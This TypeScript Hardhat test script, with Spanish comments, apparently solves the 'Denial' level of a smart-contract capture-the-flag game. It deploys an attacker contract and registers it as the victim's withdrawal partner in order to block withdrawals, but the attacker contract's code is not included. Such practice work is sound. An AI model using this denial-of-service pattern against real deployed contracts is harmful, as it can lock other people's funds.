import { expect } from "chai";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { createChallenge, submitLevel } from "./utils";
import { Interface } from "ethers/lib/utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract;
const LEVEL_ADDRESS = "0xf1D573178225513eDAA795bE9206f7E311EeDEc3";
const INSTANCIA_DEL_NIVEL: string = "0x0eF85038A37a04d601B91Ce4c590Cc825f3Cf515";
// const INSTANCIA_DEL_NIVEL: string = "";

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  // Contrato del challenge
  const challengeFactory = await ethers.getContractFactory(`Denial`);
  if (INSTANCIA_DEL_NIVEL.length > 1) {
    challenge = challengeFactory.attach(INSTANCIA_DEL_NIVEL);
    console.log(`INSTANCIA CONTRATO CHALLENGE UTILIZADA DESDE:`, challenge.address);
  }
  else {
    const challengeAddress = await createChallenge(LEVEL_ADDRESS, ethers.utils.parseEther(`0.001`));
    challenge = challengeFactory.attach(challengeAddress);
    console.log(`CONTRATO CHALLENGE DEPLOYADO EN:`, challenge.address);
  }

  // Contrato atacante (Si fuera necesario)
  const attackerFactory = await ethers.getContractFactory(`PartnerManosDeTijera`);
  attacker = await attackerFactory.deploy();
  await attacker.deployed();
  console.log(`CONTRATO ATACANTE DEPLOYADO EN:`, attacker.address);
});

describe("Denial challenge", async()=> {
  it("Resuelve el challenge - Denial", async()=>{

    // No funcionó utilizando el contrato PartnerManosDeTijera cuando estaba utilizando la versión 0.8.0 de solidity. Averiguar por qué no funcionó.
    let txSetPartner = await challenge.setWithdrawPartner(attacker.address);
    await txSetPartner.wait();
    console.log(`EL PARTNER ES: ${await challenge.partner()}`);
  })
});

after(async () => {
  expect(await submitLevel(challenge.address), "DESAFÍO INCOMPLETO").to.be.true;
});   

// Notas:
// https://codeforgeek.com/assert-vs-require-in-solidity/#assert-vs-require-in-solidity